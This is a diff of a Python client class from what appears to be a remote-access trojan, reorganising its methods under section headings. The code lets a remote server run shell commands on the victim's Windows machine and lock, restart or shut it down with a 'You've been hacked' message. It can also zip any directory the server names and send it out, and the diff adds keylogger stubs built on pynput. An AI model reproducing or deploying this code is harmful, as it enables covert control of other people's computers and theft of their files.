@@ -19,8 +19,11 @@ import time
 from pprint import pprint
 from zipfile import ZipFile
 
+from pynput.keyboard import Controller, Key
+
 
 class Client:
+# ''' SET UP CONNECTION '''
     def __init__(self, server_ip, port, buffer_size, client_ip):
         self.SERVER_IP = server_ip
         self.PORT = port
@@ -116,42 +119,62 @@ class Client:
         for i in new:
             print(i[2:-2])
 
-    def txtmsg(self):
-        print("TextMessageMode: Activated")
-        message = self.client.recv(self.BUFFER_SIZE).decode()
-        print("Server:", message)
-        # self.send(output.encode())
-        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
-        time.sleep(2)
-        self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
-    def filesend(self):
-        print("FILE SEND MODE: Enabled")
-        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
+# ''' WINDOWS FUNCTIONS '''
+    def locksystem(self):
+        msg = "rundll32.exe user32.dll, LockWorkStation"
+        self.runrun(msg)
+        self.client.send("[+] PC Locked".encode("utf-8"))
 
-        filelist = os.listdir(filePath)
-        self.client.send("Success".encode("utf-8"))
-        # create a zip archive
+    def shutdown(self):
+        #msg = "shutdown /s"
+        #self.runrun(msg)
+        self.locksystem()
 
-        archname = './logs/files.zip'
-        archive = ZipFile(archname, 'w')
+    def shutdownmessage(self):
+        msg = "shutdown /s /e 'You've been hacked '"
+        self.runrun(msg)
 
-        for file in filelist:
-            archive.write(filePath + '/' + file)
+    def restart(self):
+        msg = "shutdown /r"
+        self.runrun(msg)
 
-        archive.close()
 
-        # send size
-        archivesize = os.path.getsize(archname)
-        self.client.send(str(archivesize).encode("utf-8"))
+# ''' TELNET FUNCTIONS '''
+    def enableTN(self):
+        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
+        self.runrun(msg)
 
-        # send archive
-        with open('./logs/files.zip', 'rb') as to_send:
-            self.client.send(to_send.read())
-            print("Should have worked.")
+    def playchess(self):
+        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
+        self.runrun(msg)
+        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)
 
-        # os.remove(archname)
+    def playstarwars(self):
+        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
+        self.runrun(msg)
+        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)
 
+    def weather(self):
+        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
+        self.runrun(msg)
+        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)
+
+# ''' KEYLOGGER FUNCTIONS '''
+    def enableKeyLogger(self):
+        pass
+    def disableKeylogger(self):
+        def stopKeyLogger(self):
+            """ press esc key to stop the key logger """
+
+            keyboard = Controller()
+            keyboard.press(Key.esc)
+            keyboard.release(Key.esc)
+            self.keyLogger = False
+    def keylogs(self):
+        pass
+
+# ''' CMD Functions '''
     def runprocess(self, msg):
         obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
@@ -172,42 +195,35 @@ class Client:
         except Exception as e:
             print("This failed too (runrun) : " + str(e) + " + " + str(obj))
 
-    def enableTN(self):
-        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
-        self.runrun(msg)
 
-    def playchess(self):
-        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
-        self.runrun(msg)
-        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)
+    def txtmsg(self):
+        print("TextMessageMode: Activated")
+        message = self.client.recv(self.BUFFER_SIZE).decode()
+        print("Server:", message)
+        # self.send(output.encode())
+        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
+        time.sleep(2)
+        self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
-    def playstarwars(self):
-        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
-        self.runrun(msg)
-        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)
-
-    def weather(self):
-        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
-        self.runrun(msg)
-        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)
-
-    def locksystem(self):
-        msg = "rundll32.exe user32.dll, LockWorkStation"
-        self.runrun(msg)
-        self.client.send("[+] PC Locked".encode("utf-8"))
-
-    def shutdown(self):
-        #msg = "shutdown /s"
-        #self.runrun(msg)
-        self.locksystem()
-
-    def shutdownmessage(self):
-        msg = "shutdown /s /e 'You've been hacked '"
-        self.runrun(msg)
-
-    def restart(self):
-        msg = "shutdown /r"
-        self.runrun(msg)
+    def filesend(self):
+        print("FILE SEND MODE: Enabled")
+        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
+        filelist = os.listdir(filePath)
+        self.client.send("Success".encode("utf-8"))
+        # create a zip archive
+        archname = './logs/files.zip'
+        archive = ZipFile(archname, 'w')
+        for file in filelist:
+            archive.write(filePath + '/' + file)
+        archive.close()
+        # send size
+        archivesize = os.path.getsize(archname)
+        self.client.send(str(archivesize).encode("utf-8"))
+        # send archive
+        with open('./logs/files.zip', 'rb') as to_send:
+            self.client.send(to_send.read())
+            print("Should have worked.")
+        # os.remove(archname)
 
     def fakeshell(self):
         """ Shell """
